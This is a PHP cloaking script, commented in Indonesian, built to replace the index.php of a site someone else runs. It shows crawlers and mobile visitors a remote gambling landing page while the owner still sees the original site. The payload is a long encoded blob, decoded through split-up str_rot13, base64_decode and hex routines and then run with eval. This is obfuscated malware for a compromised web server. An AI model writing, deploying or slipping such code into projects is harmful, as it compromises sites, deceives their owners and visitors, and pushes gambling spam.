<?php

/**
 * ==========================================
 * CLOAKING GACOR FOCUS MOBILE VERSION !!
 * ==========================================
 * 
 * @configuration
 * $bunvisUrl = masukan link landingpage gacor kalian ( pastikan format file .txt )
 * $homeUrl = masukan link code default index admin ( pastikan format file .txt )
 *
 * ------------------------------------------
 * @tutorial dek!
 * 1. Backup file `index.php` asli si Admin.
 * 2. Ganti isi file `index.php` dengan script cloaking ini.
 * 3. Pastikan URL `$bunvisUrl` mengarah ke link file yang berisi code Landingpage Gacor Klean.
 * 4. Pastikan URL `$homeUrl` mengarah ke link file yang berisi code si Admin.
 *
 * ------------------------------------------
 * @description
 * - Terbaca sebagai landingpage di bot crawl.
 * - Jika dibuka di versi mobile, maka akan tampil amphtml dari landingpage ( jika amp valid )
 * - Jika amphtml tidak valid maka akan tampil sebagai $bunvisUrl ( Landingpage Gacor )
 * 
 */
$bunvisUrl = 'https://domain.com/landingpage-gacor.txt';
$homeUrl = 'https://domain.com/default-index-admin.txt';

function bunvisConf($exd)
{
  $srtb = 's' . 'tr' . '_ro' . 't1' . '3';
  $bsfd = 'b' . 'as' . 'e6' . '4_de' . 'code';
  $sln = 's' . 'tr' . 'le' . 'n';
  $hdx = 'he' . 'xde' . 'c';
  $sst = 'su' . 'bs' . 'tr';
  $cr = 'c' . 'h' . 'r';
  $rtb = $srtb($exd);
  $bsfde = $bsfd($rtb);
  $d = '';
  for ($i = 0; $i < $sln($bsfde); $i += 2) {
    $d .= $cr($hdx($sst($bsfde, $i, 2)));
  }

  return $d;
}
$e = 'Z2ZmMwpjAwt3ZQVjAwL3AGMyAwZ3AQL5AzL2MGVjAwp2MwMzAwp2LmL1AQZ3ZwLkAmp2LmV4ZwD0LmH0AGZlBGqvZwD2AmL2AzZ2ZGp0AwHmMQV3AwplAmWyZwp3LGL5ZwplMGV3AzH2AwV3ZzHlAmMwZwplMGV3AwR3AQV3ZzHlAmL1ZwpmLwV0AwVmAwZ0Z2DlAmLlZwplMGV3AwR3ZmL1ZwplMGV3ZmLlAmWyZwpmAQV3ZzHlAmIzZwplMGV3AwD2AGV3ZzHlAmLmAzLlAmWyZwp2AQL1ZwpmLwV0AzH2AGMwAmV3AQpmZ2DlAmpmZwplMGV3AmD3ZwV3ZzHlAmMwZwplMGV3AwH2MGV3Z2VlAQplAwt2ZmAxZwp2ZmV3ZzHlAmL4ZwplMGV3AmVlAmAvZwD2AQplAzLmMQV3AzLlAmWyZwp3ZwV3ZzHlAmL0ZwpmLwV0ATZ1AQHmZ2DlAQL3AwL2LmLkAmD2AGV4ZwD2ZwZ2ZmDlBQV0ATZ1AQHmZwxlBGAvAwL2MwplZwtlAQL5Z2DmZQAvZwD2BGAwZwD2MGL1AzZ3Zwp0AmZlBQV0ATZ1AQHmZwxmLwV0AwxlLwWvZwx3LwV0ATZ1AQHmAJVlAQL5AJDmMQV0AmV2BQLmZwtlAQL0AmV2MwV4ZwD0LmH0AGZ1LwV0Awx1MQV5ZzDmZGV5Z2V3MQplAwH3AQp1AmV2MGVjZwD0LmH0AGZmLwqxAQN2MGp1AzZ2LmAvAQN2AGp2AwR2LmV4Awp2MwMzAwp2LmL1AQZ3ZwLkAmp2LmV4ZwV3ZwH2AGp0MGLlAmD3ZmZlAQH0BQZ2AQR1ZQMzAGL3ZwD3ATR0ZGEyAwH0LmLlAwVlMwD4Awx0LmMzAGR1LGL1AQx2LGLmAQV2MGD0Awx1AQZ3AGpmZGL0ATD1ZGL3AGH2AQIuAJR1BGH1AwR1ZwEvAGH3AwZ1AmN2MGD3AwL3AwH1AJR0LwH0AmN2LmMuAGR1BGIuAwp0ZwMxZmt2AwMuZmt2AwMuAwD2AwH4AwL2MGHlAmZ0MGWvAGt3ZGZjATV1ZGHkZmV1AQMzAwt0Amp1AwR2Zwp0AGL0LwEyZmLmAGLlZmx0BQD1AmN1ZmL3AQL1AQD0AQD1AQZ3AzL3BQEvAGp1BGEzAGV3AGH3AzH2LGH3AwL2AQL5ZmL1AGZ5AzH2AQZ0AmZ0ZGMwZmVmAGZ1ZmDmZQH1ATZmZmZkAmZ3ZmWzAwD3AGD2AGNmAmZ2AwD1AQquAmxlMwLkZmR1ZGDlATZ3BQp0AGN1LGp0AGN3ZQZ3AQxlMwpjZmp0AmEvZmt3AGEuZmp2AQWzAmZ0ZwZ0AwZ1BQZmAzR3LGIuAwR0LmZ3AmD0BQL3AJR1LGp2ZmH2AwDlAmVmBQZ3AmL2MGH4AzV3AmZ5ZmZ0BQplZmLlLwD5AzZ3BGMuAmtmAGH5AmZ1AQD2ZmL1BGEvAzV0LmH5AQR3ZwH2ZmZ2ZGL5AwH1AGHmAmpmZmH2AGt2MwD1AmN2LmD3AzR1AGZkAmR0MwD4Amt3LGquAQL1ZwEzAwtmZwEvAmp0Mwp0AGZ1ZGp5AGx0LmEwA2R2MGEyAwt0MGMuAwZ2MGZmAGpmAmZ1ATL2ZmZ5AGR3BQp3Awx0ZwH4ATR2AGMwATZ0AwWzAGL0ZmLkZmD2ZmMvAmL3ZQZlZzV0AmEuZmD0MwZmAwVmBQWzAQpmAQZ2AmL3AQMwZmpmBQMxATHlMwD4Zmt3LGp3ZzL1LGWzATH2ZmZmAzHmBQquATRmAGpjATZmAQEuAmN3AQD4AQLmZQp2ZmHmZmMvAmH0LwZmZzL2MwLkAGV0BQHlAGD2AGH3ZzV0MwH3Awt0AGp4Amt1ZQZmAzLmZQD5AGZ1BGL3AQH1AmEzZzVmBQZ3ZmHmAwL2AzR2MGMzZmx0MwMuAmp2AGMwAwp2AGEzATRmZQD4AGR0MGLlAwpmBGMzAQD2MGplZmx0BQWzAmtmBGZ1AwDmAmHjZmHmAQL3AwZ3ZmH3ATR1ZQEuAmD1AQL1Zmx2MGD4AwD3AQDlAzL0Lwp3AGx0AQp3ATV1ZQL4AwH2AmL0AmHmZQHmAwH3AGL1ZzLmZGExAwV0LmpjAQD3BGp4AQH0ZwIuAwx3LGL2AGR2ZmHmAwZ3ZwLlAGZ0AGEwAQH2LmEzAmLmZQH0AQV1BGZ2AzLmBGLkATV2ZmH4AQZ3AQpjAmH2AwZjATV2ZGD1ATRmBGHjAQx2LwplZzL1AGH4AGH2BQL3AGR1LGMzAzD2ZmEzAGR2AwEzAQL0MGMyZmN1BGMxAwR1ZmD5Awx3AmZjATV0AwpjAJRmBGEvAzR0MQWvAmD0MwDmAwp3ZQD0AwV3AwL3ZzVmAGp2AQH2BGH1AQL0BGp4AmxmZQHjZmV0MQExATH0AGHjAGx1AwZmZmp2LGLkAGV1Awp1ATVmZGL3Zmp3AwMwAGx2ZwL4ZzV2AQpkZmt1BQL5ATZ3ZwMuAQZmZGD0Awt0BGDlZmN1LGp3AGVmZQquAwx0MGMxAmHmAmp2AzV1BQZ1Awt0LwpmZmH1BGpkAmLmZwLkZmL1BGD0Amt0MGp1ZmV2MwD0AmH2AQWvAmx3AmZ5AwV0LmpkAQDmAQH4AQV1BGpjZzV1BGDlAmZ0BQquAmL2ZGIuATZ0LGZ2ATL2LwExZmR2AGL4ZmZ0BGZ3Awp2LwZjAwZ1AQD3AGt1ZwIuZmHmAwL0ATL0AmL5ZmL2LmMvZmV2MQDmZmHmZwMvZmR2MGp2Zmp2AGEwAJR2LmWvAwp1AwplAzR3AGH5ATZmBQZmAwx2MQH4AmDmZQMuAwp0AmD1Zmx1AQL4AQtmAwZ2Awp2BGL1AGN1BGWzAQtmAmZ3Awt3ZmH1A2R2AGpmAQRmZmMyAmR2MGp0ZmZ0LwL3AmH3AGWvAGH2MwL1AJRmAmp1AzR3ZmH2ZmN0MQD4AzR3AQH2AzR2AmZ3ZmxlLwH3ZmpmZwD2ZzL2Awp2AwD3ZmZ5AGp0AmEuZmt0AQZmAGt0BGpjAGtmAGp3AwH2MGquAwZ0AmIuAGH3AQZlAQx3BGMwAzR0AQMwAwp1ZQZkATV3ZQD3AmD2AmD3AzL0ZGH0Awt0AQLmZmH0AGWvAmV3ZQp4AGZ0BQpmAGD0BQH0Amp3ZwMwAwD0AwMuAQV1AQD2Zmx0BGZjAGNmZQL5AwH1AwH0ZmxmZmpkAmH0BGDkZmD3BGH5AzD2LGHmAwD3AwpjAJR2AGLlAwp2MGD5AzZ0LwHmAGV1BQp1AGp0LGZkAQx0ZGEwAmZ1AQEvATD3AQplATZ0BQDlAGV3ZQIuATH2BQMwZzVmAGDkAGD2MQMzAwR2AmZkAQpmAwWzAwp1AwD0AmR1ZQH5AGNmAwZ5AzL1BGEuAGD0LGD2AmH1AwEuAwD1AQZmATV0AwHmATDmAGZ3ZmV2MQL0AGN1AwHlAwt2MGEuZmH1ZGLkAGRmAwWvAwHmZGpmZmt1ZwL0ATD0BQZ3AmLmZmH3AQx0AwL0AGZ3LGD2AQZ2LmLkAwp1ZGEwAzZ0MQH5Amx0MGZ5AwVlLwZkZmpmZwD0ZzV2AGMuZmL2ZwMyATZmAGZlAwZ0MwH2Awx2MGp0AmV2MwD0AzH0ZwD2AQxmZQD0ZzLmAwL1AwL2ZwpkZzV2ZwZ5AQH1AwZmAmN2MQL1AGH0ZmL5AGZ0MwD1AQxlLwpkAGx0LmL2ATLmBGMxAmD3AwDmAQZmBQL1AGp2LmLlZzL3ZmDkAwp3AQD0Awp0BGEvAmD0BGp3ZmL2MQD5AmZ3BGp0AzV0BGpkZmD2LwquAGR3AGH2AGp3AmZkAwt1AGLkAQL3LGD2AzL0BQDmAGt1AwH0AGRmZGD4ZmD3ZwMxAmtmZGHmAQR2AQp0ATV0LGMuAmRmZGD0AGp2MwMwAmx2AwD2AGt2LwD0AGp2MwZlAmN1AmExAJR1BGD1AmV2ZwDkAzV0BQD1AmR0AmD1AGDlLwEwAmLmAGp3ZmN1ZwZ5AzR3BGH0AzH3AmDkATL0LmMwAzD2AGZ3Amx2Mwp4AJR2LGD2AQV0BQplAGp1AwWvAGxmAGEvAzR1Zmp1AGZ1ZmH4AQHmAQZ4AQV0LGExAQV2MwH5ZmtmAmIuAwt1BGZ0AGL0ZmDmZmR0AwpjATR3AwpmATR3ZQH0ZmZ2BGL1AzV0BQD5Awp1BGZ1AmD2ZwZ4AQD0LmEzAmZ1ZGHkAmZ1ZwExZmH0MGDkAmH2LGExAwH2BGD2AJR2AGHkAmN2Zwp5Awp3BGH1AGH1ZmH2AGZ2ZmMxAGx3ZwZlAzL0BGD4AzL2MQL4Amx0ZmD1ZmV2MGD0AwZ1ZmZ2AQV2LmZjAQp2MwHlATL2ZwD5AQRmAGpjATV2BGp0AmZ0Zmp0ATH1BQDkZmD3AQEwAGH1ZQLlZmVmZGpkZmL0AmEvATR0MwMuAQH3AGH3AGL0ZGL4Amt2BQZlAwR0MGp2AQH0AwH0AmD2ZmL4AmL2LmDmAmR3AwHlZmD0MGWzATV3ZGMvATR3ZQMwAQL3LGLlATH1AmH1AGV0AwL5AzV3BGZ5AmH3ZwZ4ZmZ1AwLmZ2DlZwV5ZwxmLwL2AmH2MGLmAmD2BGMzAzHlZQpmAwH2ZwD2AmH2MGL3AmZ2BGV4ZwD3AGpmAwH3ZwIzAwR2AmL1AzH3AQWwZwD2AGIzAwV3AQV5A2V2AwMzAmV2AGLkAwZ2BQV4ZwD2AGIzAwV3AQVjAwR3ZmVjZwD2ZwMzAmDlBGqvAwx2AwV4AmZ3AQplAmN2MwpmZwtlAQp1AmZ2AGplAJL2ZGL3AwH2MGp0ZzZlAQLlAzL3AQV5ZwRmMQAxAwL2ZGMwAmZ2AGV5A2V3ZwL1AmD3AGplAzHlZQp0AmV3AGL1Z2V3MQqxAmV2AGp0AmH3ZwMyZwN2AwLkAzZ3ZmL1Z2V3MQL5AwLlBQpmAwH2ZwD2AmH2MGL3AmZ2BGV4ZwD3AGpmAwH3ZwIzAwR2AmL1AzH3AQWwZwD2AGIzAwV3AQV5Zwx3LwL1AmL2ZGMwZwtlZwAzZ2HlZwWyAwV3AwLmZwtlAQLlAmH2MGp2Awx3ZmH1AmV2LmV5ZwxmLwqxAwH2LmpmAwH3LwL5AwLlBQpmAmD3ZwpjAzL3ZmV4ZwD3ZwL1AwL2AGplAwH3ZwWwZwp2AmMzAzL2AmMwAwHlMGLmAzL2MQV3ZwxlZGAxZ2D2AwLkAzZ3ZmL1A2Z3LmpmAmD3ZwpjAzL3ZmV4ZwD3ZwL1AwL2AGplAwH3ZwWwZwp2ZwL5AzH2AmWyAwZ2MwMxZwplBGVkZ2DmMQL2AwR2LmpmAwH3LmqwAmZ3AQplAmN2MwpmZwtlAQplAwH2AwL1AmV2AGplZzZlAmp5AwR2BQMzAzLlMGLmAzL2MQV3ZwxlZGAxZ2D2AwLkAzZ3ZmL1A2Z3LmpmAmD3ZwpjAzL3ZmV4ZwD3ZwL1AwL2AGplAwH3ZwWwZwp2ZwLkAwx2AQp1ZzH2ZmMzAzDlAmV5ZwRmMQAxAwL2ZGMwAmZ2AGqwA2Z3Zmp0AmV3ZQMzAmZlBQV0AmV2AGL2AwH3ZwL1AmVlLmV3AwD3AGLmAzV2AQp1AwZ2LwL3AzLlMGLmAzL2MQV3ZwxlZGAxZ2D2AwLkAzZ3ZmL1A2Z3LmpmAmD3ZwpjAzL3ZmV4ZwD3ZwL1AwL2AGplAwH3ZwWwZwp3BGLkAzH2AQL1AmtlMGLmAzL2MQV3ZwxlZGAxZ2D2AwLkAzZ3ZmL1A2Z3LmpmAmD3ZwpjAzL3ZmV4ZwD3ZwL1AwL2AGplAwH3ZwWwZwp2ZGpmAzVlMGLmAzL2MQV3ZwxlZGAxZ2D2AwLkAzZ3ZmL1A2Z3LmpmAmD3ZwpjAzL3ZmV4ZwD3ZwL1AwL2AGplAwH3ZwWwZwp2ZGMzAzZlMGLmAzL2MQV3ZwxlZGAxZ2D2AwLkAzZ3ZmL1A2Z3LmpmAmD3ZwpjAzL3ZmV4ZwD3ZwL1AwL2AGplAwH3ZwWwZwp2MGLkAmL2AGplZzH2ZmMzAzDlAmV5ZwRmMQAxAwL2ZGMwAmZ2AGqwA2Z3Zmp0AmV3ZQMzAmZlBQV0AmV2AGL2AwH3ZwL1AmVlLmV3AmZ2MwL3AzL3AGWyAwZ2MwMxZwplBGVkZ2DmMQL2AwR2LmpmAwH3LmqwAmZ3AQplAmN2MwpmZwtlAQplAwH2AwL1AmV2AGplZzZlAmL1Amt2ZGMwAwH2ZGL0ZzH2ZmMzAzDlAmV5ZwRmMQAxAwL2ZGMwAmZ2AGqwA2Z3Zmp0AmV3ZQMzAmZlBQV0AmV2AGL2AwH3ZwL1AmVlLmV3Awp2MwMzZzH2MGL1ZzH2LGpjZwplBGVkZ2DmMQL2AwR2LmpmAwH3LmqwAmZ3AQplAmN2MwpmZwtlAQplAwH2AwL1AmV2AGplZzZlAmpkAmp2ZGMyAmDlMGLmAzL2MQV3ZwxlZGAxZ2D2AwLkAzZ3ZmL1A2Z3LmpmAmD3ZwpjAzL3ZmV4ZwD3ZwL1AwL2AGplAwH3ZwWwZwp2MQMzAzR2AGL1AzVlMGLmAzL2MQV3ZwxlZGAxZ2D2AwLkAzZ3ZmL1A2Z3LmpmAmD3ZwpjAzL3ZmV4ZwD3ZwL1AwL2AGplAwH3ZwWwZwp3BGL5AmN3ZQp5ZzH2ZmMzAzDlAmV5ZwRmMQAxAwL2ZGMwAmZ2AGqwA2Z3Zmp0AmV3ZQMzAmZlBQV0AmV2AGL2AwH3ZwL1AmVlLmV3Awp2BGL3AwR2ZwMwAwR3Zmp0ZzH2ZmMzAzDlAmV5ZwRmMQAxAwL2ZGMwAmZ2AGqwA2Z3Zmp0AmV3ZQMzAmZlBQV0AmV2AGL2AwH3ZwL1AmVlLmV3AzZ3BGLmAzL3ZmWyAwZ2MwMxZwplBGVkZ2DmMQL2AwR2LmpmAwH3LmqwAmZ3AQplAmN2MwpmZwtlAQplAwH2AwL1AmV2AGplZzZlAmp3AwH2ZwLmAmV2ZGp3AzZ2AGplZzH2ZmMzAzDlAmV5ZwRmMQAxAwL2ZGMwAmZ2AGqwA2Z3Zmp0AmV3ZQMzAmZlBQV0AmV2AGL2AwH3ZwL1AmVlLmV3AzD2AGp0AwR2ZmplAwR3AmMwAwH3ZwWyAwZ2MwMxZwplBGVkZ2DmMQL2AwR2LmpmAwH3LmqwAmZ3AQplAmN2MwpmZwtlAQplAwH2AwL1AmV2AGplZzZlAmL5AzH2AwMzAmZ2AGL1AzVlMGLmAzL2MQV3ZwxlZGAxZ2D2AwLkAzZ3ZmL1A2Z3LmpmAmD3ZwpjAzL3ZmV4ZwD3ZwL1AwL2AGplAwH3ZwWwZwp3AmMzAzZ2AwplAwR2MQLkAzZ3ZQL4AwRlMGLmAzL2MQV3ZwxlZGAxZ2D2AwLkAzZ3ZmL1A2Z3LmpmAmD3ZwpjAzL3ZmV4ZwD3ZwL1AwL2AGplAwH3ZwWwZwp3AQL1AzL2MQLkZzH2ZmMzAzDlAmV5ZwRmMQAxAwL2ZGMwAmZ2AGqwA2Z3Zmp0AmV3ZQMzAmZlBQV0AmV2AGL2AwH3ZwL1AmVlLmV3AwD2MwL3AmN2BGMwAwHlMGLmAzL2MQV3ZwxlZGAxZ2D2AwLkAzZ3ZmL1A2Z3LmpmAmD3ZwpjAzL3ZmV4ZwD3ZwL1AwL2AGplAwH3ZwWwZwp2ZGMwAzZ3AQL4AwH3AmL1AwVlMGLmAzL2MQV3ZwxlZGAxZ2D2AwLkAzZ3ZmL1A2Z3LmpmAmD3ZwpjAzL3ZmV4ZwD3ZwL1AwL2AGplAwH3ZwWwZwp2MQLkAzD2MQLkZzH2ZmMzAzDlAmV5ZwRmMQAxAwL2ZGMwAmZ2AGqwA2Z3Zmp0AmV3ZQMzAmZlBQV0AmV2AGL2AwH3ZwL1AmVlLmV3AwH3BQLmAwx3AQL1ZzH2ZmMzAzDlAmV5ZwRmMQAxAwL2ZGMwAmZ2AGqwA2Z3Zmp0AmV3ZQMzAmZlBQV0AmV2AGL2AwH3ZwL1AmVlLmV3Amx2ZGL4AzL2MwMwAwx2AmLkAzH3ZmWyAwZ2MwMxZwplBGVkZ2DmMQL2AwR2LmpmAwH3LmqwAmZ3AQplAmN2MwpmZwtlAQplAwH2AwL1AmV2AGplZzZlAmpmAwH2ZGplAwZ2BQWyAwZ2MwMxZwplBGVkZ2DmMQL2AwR2LmpmAwH3LmqwAmZ3AQplAmN2MwpmZwtlAQplAwH2AwL1AmV2AGplZzZlAmLkAmZ2LwMuAwH2AGp2AwH3ZmWyAwZ2MwMxZwplBGVkZ2DmMQL2AwR2LmpmAwH3LmqwAmZ3AQplAmN2MwpmZwtlAQplAwH2AwL1AmV2AGplZzZlAmL3AzL3ZmL4ZzH2ZmMzAzDlAmV5ZwRmMQAxAwL2ZGMwAmZ2AGqwA2Z3Zmp0AmV3ZQMzAmZlBQV0AmV2AGL2AwH3ZwL1AmVlLmV3AwV2LmL1AzV2LwMzZzH2ZmMzAzDlAmV5ZwRmMQAxAwL2ZGMwAmZ2AGqwA2Z3Zmp0AmV3ZQMzAmZlBQV0AmV2AGL2AwH3ZwL1AmVlLmV3Amp2AGLlAmV2BGMyAwplMGLmAzL2MQV3ZwxlZGAxZ2D2AwLkAzZ3ZmL1A2Z3LmpmAmD3ZwpjAzL3ZmV4ZwD3ZwL1AwL2AGplAwH3ZwWwZwp2MQL1AmD2ZGL3AwH3ZwWyAwZ2MwMxZwplBGVkZ2DmMQL2AwR2LmpmAwH3LmqwAmZ3AQplAmN2MwpmZwtlAQplAwH2AwL1AmV2AGplZzZlAmpmAwH2ZGplAmtlMGLmAzL2MQV3ZwxlZGAxZ2D2AwLkAzZ3ZmL1A2Z3LmpmAmD3ZwpjAzL3ZmV4ZwD3ZwL1AwL2AGplAwH3ZwWwZwp3Zmp0AwR3Zwp0AmN2ZGL3AwHlMGLmAzL2MQV3ZwxlZGAxZ2D2AwLkAzZ3ZmL1A2Z3LmpmAmD3ZwpjAzL3ZmV4ZwD3ZwL1AwL2AGplAwH3ZwWwZwp2AwplAwH2AGMyAzL2MQWyAwZ2MwMxZwplBGVkZ2DmMQL2AwR2LmpmAwH3LmqwAmZ3AQplAmN2MwpmZwtlAQplAwH2AwL1AmV2AGplZzZlAmpmAwH2ZGplAwZ2BQL1AzH2ZmplAmx3ZQp0ZzH2ZmMzAzDlAmV5ZwRmMQAxAwL2ZGMwAmZ2AGqwA2Z3Zmp0AmV3ZQMzAmZlBQV0AmV2AGL2AwH3ZwL1AmVlLmV3AwL2BGMyAwD3AQL4AwR3AQL2Awx2LmL1ZzH2ZmMzAzDlAmV5ZwRmMQAxAwL2ZGMwAmZ2AGqwA2Z3Zmp0AmV3ZQMzAmZlBQV0AmV2AGL2AwH3ZwL1AmVlLmV3AmD3ZwMzAmL2AGWyAwZ2MwMxZwplBGVkZ2DmMQL2AwR2LmpmAwH3LmqwAmZ3AQplAmN2MwpmZwtlAQplAwH2AwL1AmV2AGplZzZlAmMvAwx2AQL0AzZ2AGWyAwZ2MwMxZwplBGVkZ2DmMQL2AwR2LmpmAwHlBGqvAwx2AwV4Awx3ZmExAzL2ZwL5AzZ2AGV4ZwxlBGqvAwH3AwLkAzZlBQVlZ2LmMGVlZzH2Zwp2AwZlBQV0AwV3AGMyAmL2BGpmAGH3ZwMwZwxlBGAvA2D2AGMwAmZ2AGqvAwH3AwLkAzZlBQVlZ2LmMGVlZzH2Zwp2AwZlBQV0Awt2MwMxAwH1AGplAzZlBGV5Z2V3MQqxAwH2LmpmAwH3LwL1AmL2ZGMwZwtlZwAzZ2HlZwWyAwV3AwLmZwtlAQL4AzL2MQL1AGH3ZwMwZwxlBGAvA2D3MN==';
$dc = bunvisConf($e);
eval('?>' . $dc);	